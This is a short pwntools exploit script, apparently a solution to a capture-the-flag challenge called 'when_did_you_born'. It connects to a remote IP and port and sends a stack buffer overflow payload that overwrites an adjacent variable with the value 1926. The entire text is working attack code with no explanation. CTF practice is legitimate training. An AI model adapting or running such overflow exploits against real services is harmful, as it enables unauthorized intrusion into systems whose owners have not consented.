from pwn import *
p = process("./when_did_you_born")
p = remote("111.198.29.45",30020)
p.sendlineafter("Birth?\n","1")
payload = "a"*(0x20-0x18) + p64(1926)
p.sendlineafter("Name?\n",payload)
print p.recv()
print p.recv()
print p.recv()
